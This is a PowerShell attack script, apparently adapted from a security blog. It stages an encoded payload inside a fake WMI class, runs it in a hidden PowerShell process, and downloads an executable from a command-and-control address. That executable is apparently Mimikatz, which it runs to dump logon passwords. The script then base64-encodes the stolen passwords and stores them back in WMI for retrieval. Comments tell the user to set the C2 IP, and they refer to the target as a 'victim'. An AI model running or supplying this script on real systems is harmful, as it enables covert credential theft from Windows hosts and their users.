# This code was derived from https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html

function wmidump {
$newClass = New-Object System.Management.ManagementClass("root\cimv2", [String]::Empty, $null)
$newClass["__CLASS"] = "Win32_AuditCode"
$newClass.Qualifiers.Add("Static", $true)
$newClass.Properties.Add("Code", [System.Management.CimType]::String, $false)
$newClass.Properties["Code"].Qualifiers.Add("key", $true)
$newClass.Properties["Code"].Value = "JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADQAOgA4ADAAOAAwAC8AbQAiACwAIgBtAC4AZQB4AGUAIgApADsAIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAFMAdABhAHIAdABJAG4AZgBvADsAIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwAuAEYAaQBsAGUATgBhAG0AZQAgAD0AIAAiAG0ALgBlAHgAZQAiADsAIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQARQByAHIAbwByACAAPQAgACQAdAByAHUAZQA7ACAAJABQAHIAbwBjAGUAcwBzAEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ACAAPQAgACQAdAByAHUAZQA7ACAAJABQAHIAbwBjAGUAcwBzAEkAbgBmAG8ALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAgAD0AIAAkAGYAYQBsAHMAZQA7ACAAJABQAHIAbwBjAGUAcwBzAEkAbgBmAG8ALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIABAACgAIgBwAHIAaQB2AGkAbABlAGcAZQA6ADoAZABlAGIAdQBnACIALAAiAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAHAAYQBzAHMAdwBvAHIAZABzACIALAAiAGUAeABpAHQAIgApADsAIAAkAFAAcgBvAGMAZQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwA7ACAAJABQAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8AIAA9ACAAJABQAHIAbwBjAGUAcwBzAEkAbgBmAG8AOwAgACQAUAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdAAoACkAIAB8ACAATwB1AHQALQBOAHUAbABsADsAIAAkAG8AdQB0AHAAdQB0ACAAPQAgACQAUAByAG8AYwBlAHMAcwAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7ACAAJABQAHcAcwAgAD0AIAAiACIAOwAgAEYAbwByAEUAYQBjAGgAIAAoACQAbABpAG4AZQAgAGkAbgAgACQAKAAkAG8AdQB0AHAAdQB0ACAALQBzAHAAbABpAHQAIAAiAGAAcgBgAG4AIgApACkAIAB7AGkAZgAgACgAJABsAGkAbgBlAC4AQwBvAG4AdABhAGkAbgBzACgAJwBQAGEAcwBzAHcAbwByAGQAJwApACAALQBhAG4AZAAgACgAJABsAGkAbgBlAC4AbABlAG4AZwB0AGgAIAAtAGwAdAAgADUAMAApACkAIAB7ACQAUAB3AHMAIAArAD0AIAAkAGwAaQBuAGUAfQB9ADsAIAAkAFAAdwBCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAUAB3AHMAKQA7ACAAJABFAG4AYwBQAHcAcwAgAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAUAB3AEIAeQB0AGUAcwApADsAIABTAGUAdAAtAFcAbQBpAEkAbgBzAHQAYQBuAGMAZQAgAC0AUABhAHQAaAAgAFwAXAAuAFwAcgBvAG8AdABcAGMAaQBtAHYAMgA6AFcAaQBuADMAMgBfAEEAdQBkAGkAdABDAG8AZABlACAALQBBAHIAZwB1AG0AZQBuAHQAIABAAHsAUgBlAHMAdQBsAHQAPQAkAEUAbgBjAFAAdwBzAH0A"
$newClass.Properties.Add("Result", [System.Management.CimType]::String, $false) 
$newClass.Properties["Result"].Qualifiers.Add("Key", $true) 
$newClass.Properties["Result"].Value = "" 
$newClass.Put()
Start-Sleep -s 5 
$p = [wmiclass]"\\.\root\cimv2:Win32_Process" 
$s = [wmiclass]"\\.\root\cimv2:Win32_ProcessStartup"
$s.Properties['ShowWindow'].value=$false
$code = ([wmiclass]"\\.\root\cimv2:Win32_AuditCode").Properties["Code"].value
$p.Create("powershell.exe -enc $code")
$ps = Get-Process powershell | select starttime,id | Sort-Object -Property starttime | select -last 1 | select -expandproperty id
Get-Process powershell | select starttime,id 
$ps
Wait-Process -Id $ps
$EncodedText = Get-WmiObject -Class Win32_AuditCode -NameSpace "root\cimv2" | Select -ExpandProperty Result
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
Return $DecodedText

# Update the C2 IP value below then encode the command using https://raikia.com/tool-powershell-encoder/
# Paste encoded output into quote on line 7 -- $newClass.Properties["Code"].Value = "[Here]"
# $wc = New-Object System.Net.WebClient; $wc.DownloadFile("http://192.168.0.4:8080/m","m.exe"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = "m.exe"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @("privilege::debug","sekurlsa::logonpasswords","exit"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = ""; ForEach ($line in $($output -split "`r`n")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); $EncPws =[Convert]::ToBase64String($PwBytes); Set-WmiInstance -Path \\.\root\cimv2:Win32_AuditCode -Argument @{Result=$EncPws}

# Note: Running this script multiple times on the same victim may fail unless you delete the created WMI Class
}
